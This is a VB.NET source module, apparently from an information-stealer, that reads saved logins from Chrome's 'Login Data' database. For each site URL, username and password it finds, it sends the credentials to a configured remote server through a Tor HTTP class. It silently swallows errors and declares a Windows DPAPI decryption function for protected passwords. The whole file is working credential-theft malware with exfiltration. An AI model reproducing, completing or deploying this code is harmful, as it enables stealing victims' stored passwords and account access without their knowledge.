Imports System.Runtime.InteropServices
Imports System.IO
Imports System.Text
Module Chrome
    Public cPass As String
    Public Sub GetChrome()
        Try
            Dim datapath As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\Google\Chrome\User Data\Default\Login Data"


            Dim SQLDatabase = New SQLiteHandler(datapath)
            SQLDatabase.ReadTable("logins")

            If File.Exists(datapath) Then

                Dim host, user, pass As String

                For i = 0 To SQLDatabase.GetRowCount() - 1 Step 1
                    host = SQLDatabase.GetValue(i, "origin_url")
                    user = SQLDatabase.GetValue(i, "username_value")
                    pass = SQLDatabase.GetValue(i, "password_value")

                    If (user <> "") And (pass <> "") Then

                        Threading.Thread.Sleep(2000)
                        Dim http As New SendHTTPonTor
                        Dim log As New LogModel With {
                            .KeyUnique = GetConfigJson.KeyUnique,
                            .Message = "PASS*" & host & "*" & user & "*" & pass & "*",
                            .Type = "Password"
                        }
                        http.TalkChannelHTTP(log, Config.UrlVariables.LogUrl, Config.Variables.Address, Config.Variables.ServerReachPort)
                        If Config.Variables.Debug Then
                            Console.WriteLine("PASS*" & host & "*" & user & "*" & pass & "*")
                        End If
                    End If
                Next

            End If
        Catch : End Try
    End Sub
    <DllImport("Crypt32.dll", SetLastError:=True, CharSet:=System.Runtime.InteropServices.CharSet.Auto)>
    Private Function CryptUnprotectData(ByRef pDataIn As DATA_BLOB, ByVal szDataDescr As String, ByRef pOptionalEntropy As DATA_BLOB, ByVal pvReserved As IntPtr, ByRef pPromptStruct As CRYPTPROTECT_PROMPTSTRUCT, ByVal dwFlags As Integer, ByRef pDataOut As DATA_BLOB) As Boolean
    End Function
    <Flags()> Enum CryptProtectPromptFlags
        CRYPTPROTECT_PROMPT_ON_UNPROTECT = &H1
        CRYPTPROTECT_PROMPT_ON_PROTECT = &H2
    End Enum
    <StructLayout(LayoutKind.Sequential, CharSet:=CharSet.Unicode)> Structure CRYPTPROTECT_PROMPTSTRUCT
        Public cbSize As Integer
        Public dwPromptFlags As CryptProtectPromptFlags
        Public hwndApp As IntPtr
        Public szPrompt As String
    End Structure
    <StructLayout(LayoutKind.Sequential, CharSet:=CharSet.Unicode)> Structure DATA_BLOB
        Public cbData As Integer
        Public pbData As IntPtr
    End Structure
End Module
